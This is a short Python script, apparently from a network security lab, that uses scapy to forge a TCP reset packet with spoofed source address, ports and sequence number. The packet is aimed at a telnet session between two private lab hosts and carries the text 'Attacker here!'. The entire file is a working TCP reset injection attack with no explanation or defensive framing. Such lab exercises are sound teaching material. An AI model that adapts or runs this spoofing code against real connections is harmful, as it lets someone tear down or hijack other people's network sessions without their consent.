#!/usr/bin/python
from scapy.all import *

print("SENDING RESET PACKET.........")
ip = IP(src="10.0.2.7", dst="10.0.2.6")
tcp = TCP(sport=50616, dport=23,flags="R",seq=1895087104)
##Content "Attacker here!" as a highlight
data= "Attacker here!"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)

